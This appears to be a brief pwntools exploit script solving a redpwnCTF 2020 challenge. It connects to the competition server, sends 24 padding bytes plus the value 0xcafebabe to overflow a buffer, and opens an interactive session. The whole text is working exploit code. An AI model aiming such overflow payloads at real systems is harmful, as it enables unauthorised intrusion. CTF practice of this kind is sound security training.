from pwn import *

r = remote("2020.redpwnc.tf", 31255)

payload = "A"*24
payload += p64(0xcafebabe)

r.sendline(payload)
r.interactive()
